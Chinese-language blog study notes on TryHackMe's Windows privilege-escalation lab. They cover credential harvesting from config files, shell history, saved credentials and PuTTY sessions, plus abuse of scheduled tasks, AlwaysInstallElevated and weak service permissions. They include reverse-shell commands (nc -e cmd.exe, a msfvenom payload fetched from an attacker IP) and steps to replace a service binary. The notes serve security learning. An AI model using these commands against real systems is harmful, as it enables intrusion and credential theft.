<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【学习笔记】[THM]Windows Privilege Escalation(windows提权) | lan1ocのblog</title><meta name="author" content="lan1oc"><meta name="copyright" content="lan1oc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基本知识点Administrators组可以更改系统配置SYSTEM &#x2F; LocalSystem 帐户比管理员用户具有更多的权限Local Service用于以“最低”权限运行 Windows 服务的默认帐户。它将通过网络使用匿名连接Network Service用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证 收集密码的常用位置无人值守的">
<meta property="og:type" content="article">
<meta property="og:title" content="【学习笔记】[THM]Windows Privilege Escalation(windows提权)">
<meta property="og:url" content="http://lan1oc.co/2025/04/22/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Windows%20Privilege%20Escalation(windows%E6%8F%90%E6%9D%83)/index.html">
<meta property="og:site_name" content="lan1ocのblog">
<meta property="og:description" content="基本知识点Administrators组可以更改系统配置SYSTEM &#x2F; LocalSystem 帐户比管理员用户具有更多的权限Local Service用于以“最低”权限运行 Windows 服务的默认帐户。它将通过网络使用匿名连接Network Service用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证 收集密码的常用位置无人值守的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://lan1oc.co/img/cover/1.webp">
<meta property="article:published_time" content="2025-04-22T08:00:00.000Z">
<meta property="article:modified_time" content="2025-04-24T08:00:00.000Z">
<meta property="article:author" content="lan1oc">
<meta property="article:tag" content="THM记录">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://lan1oc.co/img/cover/1.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "【学习笔记】[THM]Windows Privilege Escalation(windows提权)",
  "url": "http://lan1oc.co/2025/04/22/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Windows%20Privilege%20Escalation(windows%E6%8F%90%E6%9D%83)/",
  "image": "http://lan1oc.co/img/cover/1.webp",
  "datePublished": "2025-04-22T08:00:00.000Z",
  "dateModified": "2025-04-24T08:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "lan1oc",
      "url": "http://lan1oc.co/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/1.ico"><link rel="canonical" href="http://lan1oc.co/2025/04/22/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91[THM]Windows%20Privilege%20Escalation(windows%E6%8F%90%E6%9D%83)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【学习笔记】[THM]Windows Privilege Escalation(windows提权)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/4.webp);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover/1.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">lan1ocのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">【学习笔记】[THM]Windows Privilege Escalation(windows提权)</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">【学习笔记】[THM]Windows Privilege Escalation(windows提权)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-22T08:00:00.000Z" title="发表于 2025-04-22 16:00:00">2025-04-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-24T08:00:00.000Z" title="更新于 2025-04-24 16:00:00">2025-04-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="基本知识点"><a href="#基本知识点" class="headerlink" title="基本知识点"></a>基本知识点</h1><p>Administrators组可以更改系统配置<br><strong>SYSTEM &#x2F; LocalSystem</strong> 帐户比管理员用户具有更多的权限<br>Local Service用于以“最低”权限运行 Windows 服务的默认帐户。它将通过网络使用匿名连接<br>Network Service用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证</p>
<h1 id="收集密码的常用位置"><a href="#收集密码的常用位置" class="headerlink" title="收集密码的常用位置"></a>收集密码的常用位置</h1><h2 id="无人值守的-Windows-安装"><a href="#无人值守的-Windows-安装" class="headerlink" title="无人值守的 Windows 安装"></a>无人值守的 Windows 安装</h2><p>在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能会存储在计算机的以下位置：</p>
<ul>
<li>C:\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml<br>作为这些文件的一部分，可能会遇到凭证，比如<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423163348.png"></li>
</ul>
<h2 id="Powershell-历史命令"><a href="#Powershell-历史命令" class="headerlink" title="Powershell 历史命令"></a>Powershell 历史命令</h2><p>可以用cmd查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423163710.png"><br>powershell查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423164225.png"></p>
<h2 id="保存的-Windows-凭据"><a href="#保存的-Windows-凭据" class="headerlink" title="保存的 Windows 凭据"></a>保存的 Windows 凭据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>

<p>发现任何值得尝试的凭据——<strong>有<code>Domain:interactive=</code>的就是要找的</strong>，可以再用<code>runas</code> 命令和 <code>/savecred</code> 实现免密切用户调用终端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure>

<h2 id="IIS-配置"><a href="#IIS-配置" class="headerlink" title="IIS 配置"></a>IIS 配置</h2><p>IIS 上的网站配置存储在名为 <code>web.config</code> 的文件中，可以存储数据库或配置的身份验证机制的密码</p>
<ul>
<li><p>C:\inetpub\wwwroot\web.config</p>
</li>
<li><p>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</p>
<pre><code>1
</code></pre>
</li>
</ul>
<p>| </p>
<pre><code>    type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  
      
</code></pre>
<p>—|—  </p>
<h2 id="从软件中检索凭据：PuTTY"><a href="#从软件中检索凭据：PuTTY" class="headerlink" title="从软件中检索凭据：PuTTY"></a>从软件中检索凭据：PuTTY</h2><p>PuTTY 是 Windows 系统上常见的 SSH 客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们检索其密码的用户名。运行上述命令后，存储的代理用户名也应该可见</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不知道是谁创建的，可以这样搜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;tokens=*&quot; %i in (&#x27;reg query HKEY_CURRENT_USER\Software\&#x27;) do reg query &quot;%i\PuTTY\Sessions&quot; &gt;nul 2&gt;&amp;1 &amp;&amp; echo %i</span><br></pre></td></tr></table></figure>

<h2 id="实操与回答问题"><a href="#实操与回答问题" class="headerlink" title="实操与回答问题"></a>实操与回答问题</h2><h3 id="julia-jones-用户的密码已保留在-Powershell-历史记录中。密码是什么？"><a href="#julia-jones-用户的密码已保留在-Powershell-历史记录中。密码是什么？" class="headerlink" title="julia.jones 用户的密码已保留在 Powershell 历史记录中。密码是什么？"></a>julia.jones 用户的密码已保留在 Powershell 历史记录中。密码是什么？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt |  findstr &quot;julia.jones&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423170224.png"></p>
<h3 id="远程主机上正在运行-Web-服务器。在与-IIS-关联的-web-config-文件上查找任何感兴趣的密码。db-admin-用户的密码是什么？"><a href="#远程主机上正在运行-Web-服务器。在与-IIS-关联的-web-config-文件上查找任何感兴趣的密码。db-admin-用户的密码是什么？" class="headerlink" title="远程主机上正在运行 Web 服务器。在与 IIS 关联的 web.config 文件上查找任何感兴趣的密码。db_admin 用户的密码是什么？"></a>远程主机上正在运行 Web 服务器。在与 IIS 关联的 web.config 文件上查找任何感兴趣的密码。db_admin 用户的密码是什么？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config|findstr &quot;db_admin&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423170612.png"></p>
<h3 id="您的-Windows-凭据上保存了密码。使用-cmdkey-和-runas，为-mike-katz-生成一个-shell，并从他的桌面上检索标志。"><a href="#您的-Windows-凭据上保存了密码。使用-cmdkey-和-runas，为-mike-katz-生成一个-shell，并从他的桌面上检索标志。" class="headerlink" title="您的 Windows 凭据上保存了密码。使用 cmdkey 和 runas，为 mike.katz 生成一个 shell，并从他的桌面上检索标志。"></a>您的 Windows 凭据上保存了密码。使用 cmdkey 和 runas，为 mike.katz 生成一个 shell，并从他的桌面上检索标志。</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list|findstr &quot;mike.katz&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:mike.katz cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423170908.png"><br>然后看flag<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423171739.png"></p>
<h3 id="检索存储在您的配置文件下保存的-PuTTY-会话中的已保存密码。thom-smith-用户的密码是什么？"><a href="#检索存储在您的配置文件下保存的-PuTTY-会话中的已保存密码。thom-smith-用户的密码是什么？" class="headerlink" title="检索存储在您的配置文件下保存的 PuTTY 会话中的已保存密码。thom.smith 用户的密码是什么？"></a>检索存储在您的配置文件下保存的 PuTTY 会话中的已保存密码。thom.smith 用户的密码是什么？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;tokens=*&quot; %i in (&#x27;reg query HKEY_CURRENT_USER\Software\&#x27;) do reg query &quot;%i\PuTTY\Sessions&quot; &gt;nul 2&gt;&amp;1 &amp;&amp; echo %i</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/79287d6ab6519a2189c65f5b8e9fc419.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">搜出来感觉能利用的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来直接检索凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/91474073e7b93acdb68055f409b834ab.png"></p>
<h1 id="其他提权思路"><a href="#其他提权思路" class="headerlink" title="其他提权思路"></a>其他提权思路</h1><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn vulntask /fo list /v</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关注Run As User和Task to Run参数的值就行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果当前用户可以修改或覆盖 “Task to Run” 可执行文件，我们就可以控制”Run As User”用户执行的内容，从而产生简单的权限提升<br>检查计划任务执行文件的权限可以用以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls c:\tasks\schtask.bat</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424095038.png"><br>如图中显示<code>BUILTIN\Users:(I)(F)</code>，<strong>这意味着所有经过身份验证的用户都可以读取、写入、执行和删除这些文件</strong><br>BUILTIN\Users 组默认包含所有经过身份验证的用户，通常权限较为有限<br>然后我们可以利用它来弹shell，比如nc弹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo c:\tools\nc64.exe -e cmd.exe 10.21.170.43 404 &gt; C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure>

<p>如果太久没收到shell，就自行运行一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /tn vulntask</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424100336.png"></p>
<h2 id="msi-文件提权"><a href="#msi-文件提权" class="headerlink" title="msi 文件提权"></a>msi 文件提权</h2><p>将<code>AlwaysInstallElevated</code>策略开启后，Windows Installer 会<strong>始终以提升的权限安装</strong> MSI 包<br>这可能允许以管理员权限运行生成的恶意的 MSI 文件<br>此方法需要设置两个注册表值。可以使用以下命令从命令行查询这些内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

<p>如果查到类似以下信息，<strong><code>HKCU</code> 与 <code>HKLM</code> 下同时开启（都为 <code>0x1</code>）才真正触发漏洞——普通用户安装 MSI 包时会自动获得 SYSTEM 权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br><span class="line"></span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装恶意msi包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure>

<h2 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h2><p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424103609.png"></p>
<h1 id="滥用服务配置错误-以下三种方法是逐级兜底的"><a href="#滥用服务配置错误-以下三种方法是逐级兜底的" class="headerlink" title="滥用服务配置错误(以下三种方法是逐级兜底的)"></a>滥用服务配置错误(以下三种方法是逐级兜底的)</h1><h3 id="基本知识点-1"><a href="#基本知识点-1" class="headerlink" title="基本知识点"></a>基本知识点</h3><p><code>sc qc</code>查看指定服务配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc apphostsvc</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关联的可执行文件是通过BINARY_PATH_NAME参数指定的，用于运行服务的帐户显示在SERVICE_START_NAME参数上</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424103934.png"><br>服务具有任意访问控制列表 （DACL），该列表指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务，以及其他权限。DACL 可以从<a target="_blank" rel="noopener" href="https://systeminformer.sourceforge.io/downloads">Process Hacker</a>中看到<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424104503.png"><br>所有服务配置都存储在注册表中的以下位置 <code>HKLM\SYSTEM\CurrentControlSet\Services\</code>:<br>系统中的每个服务都有一个子项。同样，我们可以在 <strong>ImagePath</strong> 值上看到关联的可执行文件，并在 <strong>ObjectName</strong> 值上看到用于启动服务的帐户。如果已为服务配置了 DACL，则它将存储在名为 <strong>Security</strong> 的子项中。正如您现在已经猜到的那样，默认情况下，只有管理员才能修改此类注册表项</p>
<h2 id="对服务可执行文件的不安全权限"><a href="#对服务可执行文件的不安全权限" class="headerlink" title="对服务可执行文件的不安全权限"></a>对服务可执行文件的不安全权限</h2><p>如果与服务关联的可执行文件具有允许攻击者修改或替换它的弱权限，则攻击者可以轻易地获得服务帐户的权限<br>比如查看易受攻击的服务配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc WindowsScheduler</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424105836.png"><br>易受攻击的软件安装的服务以 svcuser1 账户身份运行，并且与该服务关联的可执行文件位于 中 <code>C:\Progra~2\System~1\WService.exe</code><br>继续查看这个服务执行的文件的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424110046.png"><br>Everyone 组对服务的可执行文件具有修改权限 （M）。这意味着可以简单地用任何有效负载覆盖它，并且该服务将使用配置的用户帐户的权限执行它<br>用生成一个 exe-service 有效负载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.170.43 LPORT=404 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424110610.png"><br>换powershell把马下下来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.21.170.43:8080/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424110927.png"><br>由于需要另一个用户来执行有效负载，因此还需要向 Everyone 组授予完全权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd C:\PROGRA~2\SYSTEM~1\</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move WService.exe WService.exe.bkp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move C:\Users\thm-unpriv\Desktop\rev-svc.exe WService.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls WService.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p>最后，重新启动服务<br>实战中，必须等待服务重启，除非有权限直接重启</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc stop windowsscheduler</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start windowsscheduler</span><br></pre></td></tr></table></figure>

<p><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250424112812.png"></p>
<h2 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h2><p>不能直接写入服务可执行文件时，可能仍然有机会通过使用一个相当晦涩的功能来强制服务运行任意可执行文件<br>使用 Windows 服务时，当服务配置为指向“未加引号的”可执行文件时，会发生非常特殊的行为。unquote 的意思是关联可执行文件的路径没有正确引用，以考虑命令上的空格<br>比如这样<br><img src="/../../images/windows%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/33929383b1c0776ae15b9c2c607fb74f.png"><br>当 SCM 尝试执行关联的二进制文件时，会出现问题。由于 “Disk Sorter Enterprise” 文件夹的名称上有空格，因此命令变得不明确，并且 SCM 不知道您尝试执行以下哪项作，可能是以下几种</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Argument 1</th>
<th>Argument 2</th>
</tr>
</thead>
<tbody><tr>
<td>C:\MyPrograms\Disk.exe</td>
<td>Sorter</td>
<td>Enterprise\bin\disksrs.exe</td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter.exe</td>
<td>Enterprise\bin\disksrs.exe</td>
<td></td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
<td></td>
<td></td>
</tr>
<tr>
<td>SCM会开始按照表中所示的顺序搜索每个二进制文件：</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<ol>
<li><p>首先，搜索 <code>C：\\MyPrograms\\Disk.exe</code>。如果存在，则服务将运行此可执行文件。</p>
</li>
<li><p>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter.exe</code> 。如果存在，则服务将运行此可执行文件。</p>
</li>
<li><p>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code> 。此选项预期会成功，并且通常会在默认安装中运行。</p>
</li>
</ol>
